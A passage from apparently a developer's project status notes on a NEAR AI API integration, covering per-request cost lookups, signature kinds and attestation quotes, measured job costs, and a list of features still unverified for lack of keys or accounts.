  `{requestIds}` and returns `{requests:[{requestId, costNanoUsd}]}` (exactly tokens × price);
  signatures are `provider_tee` or `gateway` kind; a model attestation's report data is read from its
  quote (hex 1136–1264); json_schema honoured on all three tiers; reasoning models can return null
  content (billed). Measured: a Standard job costs about $0.0008 live (the economy model says $0.006).

## Still unverified (needs keys or accounts)

- NEAR AI per-agent key creation and spend limits (`POST /v1/workspaces/{ws}/api-keys`, `PATCH
  …/spend-limit`): needs a session token. All live calls use the one org key.
- `NearAuthClient` against a token from a real sign-in: needs a person in the popup on
  http://localhost:3000. JWKS, issuer and the client's allowed callback were checked 2026-11-12.
- `OneClickClient`: everything beyond a keyless dry quote; mainnet only and not enabled.
- TDX quote, event log and GPU evidence verification are not implemented (signature + nonce only).
